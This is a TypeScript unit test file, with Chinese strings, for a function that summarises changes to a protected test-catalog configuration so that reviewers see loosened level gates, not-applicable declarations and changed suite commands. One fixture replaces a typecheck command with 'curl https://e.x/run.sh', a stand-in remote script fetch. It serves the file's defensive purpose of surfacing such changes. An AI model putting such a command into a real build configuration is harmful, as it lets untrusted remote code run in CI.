/**
 * 受保护配置改动的语义摘要：目录摘要除套件 / 服务外，还要让用户看见档位定义与项目级不适用声明的变化。
 */
import { describe, expect, it } from 'vitest'
import { describeProtectedChange } from './protected-summary.js'

const SCHEMA = 'schema: tenon-test-catalog/v1\n'
const SUITE_TYPES = '  - id: types\n    kind: typecheck\n    runner: tsc\n    command: npx tsc --noEmit\n'
const BEFORE = `${SCHEMA}suites:\n${SUITE_TYPES}`
const FALLBACK = '套件、服务、档位定义与不适用声明都没有变化（其它字段有改动）'

function suiteBlock(id: string): string {
  return `  - id: ${id}\n    kind: typecheck\n    runner: tsc\n    command: npx tsc -p ${id}\n`
}

function summary(before: string | undefined, after: string | undefined): readonly string[] {
  return describeProtectedChange('catalog', before, after)
}

describe('describeProtectedChange(catalog)：档位定义', () => {
  it('只改 levels（full 档去掉必需类）：列出放宽行，不再落到「其它字段有改动」', () => {
    const lines = summary(BEFORE, `${BEFORE}levels:\n  full:\n    required: []\n`)
    expect(lines).toEqual(['档位 full：必需类去掉 unit（放宽）'])
    expect(lines.join('\n')).not.toContain('其它字段有改动')
  })

  it('去掉覆盖率门槛也看得见', () => {
    const before = `${BEFORE}levels:\n  full:\n    coverage:\n      lines: 80\n`
    expect(summary(before, BEFORE)).toEqual(['档位 full：覆盖率 lines 80 → 不设（放宽）'])
  })

  it('起点没有目录（新增）：与内建缺省比较', () => {
    const lines = summary(undefined, `${BEFORE}levels:\n  full:\n    require_baseline: true\n`)
    expect(lines).toContain('档位 full：缺基线挡出口 否 → 是（收紧）')
  })

  it('起点目录解析失败：同样按缺省比较，不抛错', () => {
    const lines = summary('not: [valid', `${BEFORE}levels:\n  full:\n    required: []\n`)
    expect(lines).toContain('档位 full：必需类去掉 unit（放宽）')
  })

  it('同时新增套件和改 levels：档位行排在套件行之前', () => {
    const after = `${BEFORE}${suiteBlock('lint-all')}levels:\n  full:\n    required: []\n`
    expect(summary(BEFORE, after)).toEqual([
      '档位 full：必需类去掉 unit（放宽）',
      '新增套件 lint-all：npx tsc -p lint-all',
    ])
  })

  it('改动很多套件时套件行截到 8 行，门槛变化仍在最前面、不被套件行挤掉', () => {
    const ids = Array.from({ length: 12 }, (_, index) => `s${String(index).padStart(2, '0')}`)
    const after = `${BEFORE}${ids.map(suiteBlock).join('')}levels:\n  full:\n    required: []\n`
    const lines = summary(BEFORE, after)
    expect(lines[0]).toBe('档位 full：必需类去掉 unit（放宽）')
    expect(lines).toHaveLength(10)
    expect(lines[9]).toBe('… 另有 4 项')
  })

  it('档位改动很多时，套件命令的变化也不被档位行挤掉（两段各自截断）', () => {
    const coverage = '    coverage:\n      lines: 90\n      branches: 90\n      functions: 90\n      statements: 90\n'
    const tiers = ['changed', 'full'].map((tier) => `  ${tier}:\n    required: []\n    scenarios: passing\n    require_baseline: true\n${coverage}`)
    const after = `${SCHEMA}suites:\n  - id: types\n    kind: typecheck\n    runner: tsc\n    command: curl https://e.x/run.sh\nlevels:\n${tiers.join('')}`
    const lines = summary(BEFORE, after)
    expect(lines).toContain('改动套件 types 的命令：npx tsc --noEmit → curl https://e.x/run.sh')
    expect(lines.indexOf('档位 changed：必需类去掉 unit（放宽）')).toBe(0)
    expect(lines.filter((line) => line.startsWith('… 另有'))).toHaveLength(1)
  })

  it('改后的目录无效、或被删除：沿用原有说明', () => {
    expect(summary(BEFORE, 'not: [valid')).toEqual(['目录无法解析（改动后的 catalog.yaml 无效）'])
    expect(summary(BEFORE, undefined)).toEqual(['目录已删除'])
  })
})

describe('describeProtectedChange(catalog)：项目级不适用声明', () => {
  const declared = (reason: string, approvedBy: string): string =>
    `${BEFORE}not_applicable:\n  - kind: lint\n    reason: ${reason}\n    approved_by: ${approvedBy}\n`

  it('新增声明：写明批准后对全项目生效；不把理由原文放进摘要', () => {
    const lines = summary(BEFORE, declared('没有 lint 需求', 'null'))
    expect(lines).toEqual(['新增项目级不适用声明 lint（批准后对全项目生效）'])
    expect(lines.join('\n')).not.toContain('没有 lint 需求')
  })

  it('删除声明', () => {
    expect(summary(declared('没有 lint 需求', 'null'), BEFORE)).toEqual(['删除项目级不适用声明 lint'])
  })

  it('理由变了：改动项目级不适用声明的理由，仍不含理由原文', () => {
    const lines = summary(declared('旧理由', 'null'), declared('新理由', 'null'))
    expect(lines).toEqual(['改动项目级不适用声明 lint 的理由'])
    expect(lines.join('\n')).not.toMatch(/旧理由|新理由/u)
  })

  it('只有 approved_by 变化：不出不适用声明的行，落到兜底文案', () => {
    expect(summary(declared('没有 lint 需求', 'null'), declared('没有 lint 需求', 'r@x.io'))).toEqual([FALLBACK])
  })

  it('档位行在不适用声明行之前，其后是套件行', () => {
    const after = `${BEFORE}${suiteBlock('lint-all')}not_applicable:\n  - kind: lint\n    reason: x\n    approved_by: null\nlevels:\n  full:\n    required: []\n`
    expect(summary(BEFORE, after)).toEqual([
      '档位 full：必需类去掉 unit（放宽）',
      '新增项目级不适用声明 lint（批准后对全项目生效）',
      '新增套件 lint-all：npx tsc -p lint-all',
    ])
  })
})

describe('describeProtectedChange(catalog)：其它字段', () => {
  it('只改 profiles_env：套件、服务、档位、不适用声明都没变，给兜底文案', () => {
    expect(summary(BEFORE, `${SCHEMA}profiles_env: [CI]\nsuites:\n${SUITE_TYPES}`)).toEqual([FALLBACK])
  })

  it('没有任何变化的目录：同样是兜底文案', () => {
    expect(summary(BEFORE, BEFORE)).toEqual([FALLBACK])
  })
})
